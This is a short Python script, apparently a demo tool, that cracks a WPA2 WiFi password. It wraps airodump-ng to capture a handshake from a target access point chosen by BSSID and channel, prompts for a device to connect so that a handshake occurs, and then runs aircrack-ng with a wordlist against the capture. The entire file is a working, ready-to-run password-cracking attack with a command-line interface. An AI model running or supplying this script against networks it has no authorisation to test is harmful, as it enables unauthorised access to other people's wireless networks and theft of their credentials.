import argparse
import subprocess
import time
import os

def crack_password(interface, bssid, channel, wordlist):
    capture_file = "handshake_demo"
    airodump_cmd = [
        "sudo", "airodump-ng", 
        "--bssid", bssid, 
        "--channel", channel, 
        "--write", capture_file,
        interface
    ]

    print(f"[*] Starting capture on {bssid} (Channel {channel})...")
    airodump_process = subprocess.Popen(airodump_cmd)

    print("\033[93m[ACTION] Connect a device to the WiFi now to trigger a handshake...\033[0m")
    
    try:
        time.sleep(30) 
    except KeyboardInterrupt:
        print("[*] Stopping capture early...")

    airodump_process.terminate()
    airodump_process.wait()

    cap_path = f"{capture_file}-01.cap"
    
    if os.path.exists(cap_path):
        aircrack_cmd = ["sudo", "aircrack-ng", "-w", wordlist, "-b", bssid, cap_path]
        subprocess.run(aircrack_cmd)
    else:
        print("[!] Error: Capture file not found.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Crack WPA2 password demo")
    parser.add_argument("--interface", required=True, help="Monitor mode interface")
    parser.add_argument("--bssid", required=True, help="MAC address of the AP")
    parser.add_argument("--channel", required=True, help="WiFi channel (e.g., 6)")
    parser.add_argument("--wordlist", required=True, help="Path to wordlist")

    args = parser.parse_args()
    crack_password(args.interface, args.bssid, args.channel, args.wordlist)